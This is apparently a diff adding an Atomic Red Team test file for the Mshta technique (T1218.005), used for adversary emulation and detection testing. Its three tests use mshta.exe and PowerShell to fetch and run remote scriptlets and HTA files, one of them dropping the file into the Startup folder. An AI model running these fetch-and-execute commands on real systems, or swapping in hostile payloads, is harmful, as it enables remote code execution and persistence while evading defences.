@@ -1,0 +1,52 @@
+attack_technique:
+- T1218.005
+display_name: Mshta
+atomic_tests:
+- name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
+  description: |
+    Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_url:
+      description: location of the payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
+  executor:
+    command: |
+      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+    name: command_prompt
+- name: Mshta executes VBScript to execute malicious command
+  description: |
+    Run a local VB script to run local user enumeration powershell command.
+    This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+    Upon execution, a new PowerShell windows will be opened that displays user information.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+    name: command_prompt
+- name: Mshta Executes Remote HTML Application (HTA)
+  description: |
+    Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    temp_file:
+      description: temp_file location for hta
+      type: string
+      default: $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta
+    hta_url:
+      description: URL to HTA file for execution
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+  executor:
+    command: |
+      $var =Invoke-WebRequest "#{hta_url}"
+      $var.content|out-file "#{temp_file}"
+      mshta "#{temp_file}"
+    cleanup_command: |
+      remove-item "#{temp_file}" -ErrorAction Ignore
+    name: powershell
+
